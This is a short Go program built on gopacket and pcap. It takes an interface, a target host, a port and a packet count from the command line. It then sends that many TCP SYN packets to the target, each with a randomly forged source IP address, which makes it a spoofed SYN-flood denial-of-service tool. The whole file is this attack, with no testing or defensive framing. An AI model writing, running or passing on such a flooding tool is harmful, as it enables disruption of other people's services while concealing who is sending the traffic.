package main

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
)

func main() {

	fmt.Println(os.Args)

	if len(os.Args) != 5 {
		log.Fatalf("Usage: %s interface host port packets", os.Args[0])
	}

	iface := os.Args[1]
	host := os.Args[2]
	port, err := strconv.Atoi(os.Args[3])
	if err != nil {
		log.Fatalf("Invalid port: %v", err)
	}
	packets, err := strconv.Atoi(os.Args[4])
	if err != nil {
		log.Fatalf("Invalid number of packets: %v", err)
	}

	// Open raw socket
	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Random source IP's
	//rand.Seed(time.Now().UnixNano())
	for i := 0; i < packets; i++ {
		srcIP := net.IPv4(byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)))
		dstIP := net.ParseIP(host)

		// Set up the TCP layer
		ipLayer := &layers.IPv4{
			SrcIP:    srcIP,
			DstIP:    dstIP,
			Protocol: layers.IPProtocolTCP,
		}
		tcpLayer := &layers.TCP{
			SrcPort: 0, // Can be any port
			DstPort: layers.TCPPort(port),
			SYN:     true,
		}
		tcpLayer.SetNetworkLayerForChecksum(ipLayer)

		// Build the packet
		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			ComputeChecksums: true,
			FixLengths:       true,
		}
		err := gopacket.SerializeLayers(buf, opts, ipLayer, tcpLayer)
		if err != nil {
			// Error during serialization
			log.Fatalf("Error during serialization: %v", err)
		}

		// Send the packet
		err = handle.WritePacketData(buf.Bytes())
		if err != nil {
			// Error during sending
			log.Fatalf("Error during sending: %v", err)
		}
	}

	fmt.Printf("Sent %d packets to %s:%d\n", packets, host, port)
}
